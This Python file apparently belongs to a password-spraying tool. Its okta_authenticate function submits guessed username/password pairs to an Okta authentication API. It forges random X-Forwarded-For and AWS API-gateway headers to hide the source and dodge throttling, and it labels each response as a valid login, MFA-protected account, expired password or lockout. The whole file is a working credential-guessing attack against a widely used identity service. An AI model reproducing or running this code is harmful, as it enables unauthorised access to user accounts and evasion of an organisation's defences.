import json, datetime, requests, random


def check_throttle(response):

	if response.status_code == 429:
		return True
	else:
		return False


def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def okta_authenticate(url, username, password, useragent):
	ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

	data_response = {
		'timestamp': ts,
		'username': username,
		'password': password,
		'success': False,
		'change': False,
		'2fa_enabled': False,
		'type': None,
		'code': None,
		'name': None,
		'action': None,
		'headers': [],
		'cookies': [],
		'sourceip' : None,
		'throttled' : False,
		'error' : False,
		'output' : ""
	}

	raw_body = "{\"username\":\"%s\",\"password\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" % (username, password)

	spoofed_ip = generate_ip()
	amazon_id = generate_id()
	trace_id = generate_trace_id()

	headers = {
		'Content-Type': 'application/json',
		'User-Agent': useragent,
		"X-My-X-Forwarded-For" : spoofed_ip,
		"x-amzn-apigateway-api-id" : amazon_id,
		"X-My-X-Amzn-Trace-Id" : trace_id,
	}


	try:
		resp = requests.post("{}/api/v1/authn/".format(url),data=raw_body,headers=headers)

		if resp.status_code == 200:
			resp_json = json.loads(resp.text)

			if resp_json.get("status") == "LOCKED_OUT": #Warning: administrators can configure Okta to not indicate that an account is locked out. Fair warning ;)
				data_response['success'] = False
				data_response['output'] ='FAILED: Locked out {}:{}'.format(username, password)
				data_response['action'] = 'redirect'

			elif resp_json.get("status") == "SUCCESS":
				data_response['success'] = True
				data_response['output'] = 'SUCCESS: {}:{}'.format(username, password)

			elif resp_json.get("status") == "MFA_REQUIRED":
				data_response['2fa_enabled'] = True
				data_response['success'] = True
				data_response['output'] = "SUCCESS: 2FA {}:{}".format(username,password)

			elif resp_json.get("status") == "PASSWORD_EXPIRED":
				data_response['change'] = True
				data_response['success'] = True
				data_response['output'] = "SUCCESS: password expired {}:{}".format(username,password)

			else:
				data_response['success'] = False
				data_response['output'] = "ALERT: 200 but doesn't indicate success {}:{}".format(username,password)
		else:
			data_response['success'] = False
			data_response['code'] = resp.status_code
			data_response['output'] = "FAILED: {} => {}:{}".format(resp.status_code, username, password)

	except Exception as ex:
		data_response['error'] = True
		data_response['output'] = ex
		pass

	return data_response
